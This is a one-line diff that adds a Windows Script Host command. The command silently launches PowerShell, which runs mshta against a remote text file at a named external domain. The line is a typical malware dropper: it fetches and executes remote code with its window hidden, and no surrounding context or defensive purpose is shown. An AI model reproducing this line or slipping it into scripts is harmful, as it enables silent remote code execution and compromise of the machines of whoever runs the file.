@@ -1,0 +1,1 @@
+WScript.CreateObject("WScript.Shell").Run("Powershell.exe mshta https://vpn-guiden.com/Encoding.txt",0);
